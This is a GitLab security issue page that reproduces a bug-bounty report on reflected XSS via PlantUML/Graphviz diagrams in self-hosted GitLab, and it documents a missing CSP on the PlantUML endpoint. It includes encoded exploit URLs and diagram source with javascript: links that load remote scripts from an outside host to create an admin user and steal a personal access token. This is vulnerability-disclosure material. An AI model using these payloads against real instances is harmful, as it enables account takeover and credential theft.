

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Reflected XSS via PlantUML diagram

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2010926](https://hackerone.com/reports/2010926)** by `ankitsingh` on 2023-06-02, assigned to [@ameyadarshan](/ameyadarshan "Ameya Darshan"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

### Summary

I've found that when you configure your Gitlab instance to have PlantUML integration as per the documentation provided at `https://docs.gitlab.com/ee/administration/integration/plantuml.html` then this leads to an XSS vulnerability by rendering the Graphviz Diagrams.

The problem lies in the fact that PlantUML uses the insecure HTTP protocol to serve diagram image files and if you’re running Gitlab with TLS then some browsers will not allow loading those images on pages served over HTTPS or what is otherwise known as Mixed content issues. So to tackle this, it is instructed to point `/-/plantuml` endpoint of your Gitlab instance to `http://localhost:8080/plantuml` of your local PlantUML server by configuring `/etc/gitlab/gitlab.rb` to include -:

`nginx['custom_gitlab_server_config'] = "location /-/plantuml { \n rewrite ^/-/(plantuml.*) /$1 break;\n proxy_cache off; \n proxy_pass http://localhost:8080/plantuml; \n}\n"`

But this exact step gives rise to an XSS vulnerability to trigger in the context of your Gitlab instance, which can easily be escalated to an Account Takeover scenario by utilizing various methods such as stealing personal access token or forcefully becoming an Admin user within the instance etc.

### Setup -:

Make sure you have enabled your PlantUML integration and is operating properly as documented at `https://docs.gitlab.com/ee/administration/integration/plantuml.html`. For testing purpose, I've my Gitlab instance running at Debian 11.0.7 at `https://192.168.204.135`. And a Tomcat 10.1.9 server with PlantUML running at `http://192.168.1.7:8080/plantuml`. To configure the redirection, I added this line to `/etc/gitlab/gitlab.rb` -:

`nginx['custom_gitlab_server_config'] = "location /-/plantuml { \n rewrite ^/-/(plantuml.*) /$1 break;\n proxy_cache off; \n proxy_pass http://192.168.1.7:8080/plantuml; \n}\n"`

Otherwise if you're running Gitlab in Docker then you can configure the integration accordingly as per the doc.

### CSP Bypass -:

Once you're done configuring your PlantUML integration, make sure to configure the CSP (default or custom) in `/etc/gitlab/gitlab.rb` as documented at `https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy`

I observed that configuring CSP in `/etc/gitlab/gitlab.rb` doesn't renders the CSP response headers for the `https://gitlab-instance/-/plantuml/*` endpoints even if you add a default or custom directive as -:

```
gitlab_rails['content_security_policy'] = {
    enabled: true,
    report_only: false,
    directives: {
      default_src: "'none'",
      script_src: "https://example.com"
    }
}
```

This is basically an another issue which helped me to acquire a full Account Takeover scenario through the `https://gitlab-instance/-/plantuml/*` endpoint.

### i) Steps to reproduce (Becoming Admin of the instance)

1. Visit at the following URL and click at the displayed error message -:

`https://gitlab-instance/-/plantuml/svg/U9nbK4rFmp0ClVChh1nMa4gxyzhqW3G-f24X1AU9GvfuROQNbDGRcn3_dOHDcX27EBRVyxFrZEs26dguWwyBW6E-R3ljoGSfFdlBADwg23bl49PZhmQKhT_dCFA1K8hWjywWoLUM28t8uVzeZyfOry4oSVx0EP1gaMHTise9eVN1O4Id0ZGIdSkcvX2V0KMsSr8GhbWqyn1yW6kuLJRk1lP0NiM_ntY5OtHSr6qecoT2DSOUMVsUM04JhoZgaaqJGqWX7T0qERm-BwHOgvqQTR03pupNsqsIwf3dX2czEJoOo-pNh6bsLLZdCDo_F2vaDY6kZdF0X-ZKv6FhkMBSStcMF3PX3Fg4zyp3E2lBQ9F1dIgqZvgnsbXNhCSJVT9nbUJBaqWiioeP_7tn0zB0cnq0`

[![1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b3ffa1011ca4b29084348a6888382e1410c61f6d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30323366306536362d613538302d346532652d623031382d6561396436646436623933312f312e706e67)

[![2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f15af27dbd5aa8473530797812529f003130da73/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64386163643766382d373365652d346232392d393964352d6636393561333432323862622f322e706e67)

2. Now visit at `https://gitlab-instance/admin/users` and you will observe -:

[![3.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/44d523c037d24d86e8d67eaa2c7986d24502037a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65663732316564302d663962302d343530622d396335342d3132626437653565376665612f332e706e67)

Observe a new admin has been added to your instance with the name `Ankit Singh`, depicting a scenario where an unauthenticated user has become the Admin of the Gitlab instance.

Please **NOTE** that URL provided in Step-1 corresponds to this Graphviz diagram code -:

```
```plantuml
digraph G {
  graph [bgcolor="white"];
  node [shape=box, style="rounded,filled", color="white"];
  heading [fillcolor="white", label=<<table border="0" cellborder="0"><tr><td align="left">Error - Failed to load the content.<br/>Please click to reload..</td></tr></table>>, URL="javascript:document.getElementById('graph0').innerHTML='&lt;script type=&quot;text/javascript&quot; src=&quot;https://adideva.co.in/admin.js&quot; &gt;&lt;/script&gt;';"];
}
```
```

### ii) Steps to reproduce (Stealing personal Access token)

1. Visit at the following URL and click at the displayed error message -:

`https://gitlab-instance/-/plantuml/svg/U9nbK4rFmp0ClUzNM3ci89Lsv_NZW3G-f24X1AU9GvfuRJQJbDGRgn3_dOHDcYOESMo_vsVhQTDwsNTm3zyJW6E-QbhboFbAV7M6KRmN0R9E8wo6JlPODUwGmi0ZOIMysrcDEbqR8jGYXV-Z7KfjR0khoBc0Ko3P85LboR8XXCPvZG6T2L18T2xhadru6YIPrbQ2SCsYNdZlFDp0dJHXDx03SZBy7OOhBAFbh6nyNZyJoY7qoAXjP7cCl2mhSzPr23w6U41Tf_3sigp4HkxbeBpfUQwTsdr4gHPvGHZJs_5HNoL_PisIwynOY_xXzMbP9LFYuZW7F0QdffyxnmNZWVEpvB49WrSdl6FkXtcU1viqxcMcND3CjpXcc-54dhPSHF7y917Af8Zs_an-0PXFcbq0`

[![1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b3ffa1011ca4b29084348a6888382e1410c61f6d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30323366306536362d613538302d346532652d623031382d6561396436646436623933312f312e706e67)

Observe the stolen personal access token -:

[![4.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/5b836371d7539669c7fe4abdf57d0caaa4698d62/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63373464653837642d373439642d343737372d393930362d3163643739383733303037382f342e706e67)

2. Now visit at `https://gitlab-instance/-/profile/personal_access_tokens` and there also you will observe -:

[![5.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0ea8d433510441a17d29cafa531dbeeb77d03903/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64303530313264622d316634622d343737662d383139322d6563326331323832313765382f352e706e67)

Observe a new personal access token by the name `AnkitSingh` assigned with the full scope. The token will expire after 1 year (if not revoked otherwise).

Please **NOTE** that URL provided in Step-1 corresponds to this Graphviz diagram code -:

```
```plantuml
digraph G {
  graph [bgcolor="white"];
  node [shape=box, style="rounded,filled", color="white"];
  heading [fillcolor="white", label=<<table border="0" cellborder="0"><tr><td align="left">Error - Failed to load the content.<br/>Please click to reload..</td></tr></table>>, URL="javascript:document.getElementById('graph0').innerHTML='&lt;script type=&quot;text/javascript&quot; src=&quot;https://adideva.co.in/key.js&quot; &gt;&lt;/script&gt;';"];
}
```
```

##### What is the current *bug* behavior?

The generic method of enabling PlantUML integration with the self hosted Gitlab instance leads to an XSS vulnerability by rendering Graphviz Diagrams. Consequently, this leads to a full Account Takeover scenario either by inviting an Admin user to the instance or by stealing the personal access tokens. Similarly, this XSS could also be escalated to leverage many other different forms of attack scenarios.

##### What is the expected *correct* behavior?

XSS should be prohibited by employing proper validation and CSP.

###### Results of GitLab environment info

```
ankit@singh:~$ sudo gitlab-rake gitlab:env:info

System information
System:		Debian 11
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	3.0.6p216
Gem Version:	3.4.13
Bundler Version:2.4.13
Rake Version:	13.0.6
Redis Version:	6.2.11
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	16.0.1-ee
Revision:	29e1314f910
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	13.8
URL:		https://192.168.204.135
HTTP Clone URL:	https://192.168.204.135/some-group/some-project.git
SSH Clone URL:	git@192.168.204.135:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.20.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

#### Impact

Full Account Takeover either by forcefully becoming admin of the instance or by stealing personal access token is possible via XSS in Graphviz Diagram. Similarly, this XSS could also be escalated to leverage many other different forms of attack scenarios.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [2.png](https://h1.sec.gitlab.net/a/d8acd7f8-73ee-4b29-99d5-f695a34228bb/2.png)
* [1.png](https://h1.sec.gitlab.net/a/023f0e66-a580-4e2e-b018-ea9d6dd6b931/1.png)
* [4.png](https://h1.sec.gitlab.net/a/c74de87d-749d-4777-9906-1cd798730078/4.png)
* [3.png](https://h1.sec.gitlab.net/a/ef721ed0-f9b0-450b-9c54-12bd7e5e7fea/3.png)
* [5.png](https://h1.sec.gitlab.net/a/d05012db-1f4b-477f-8192-ec2c128217e8/5.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

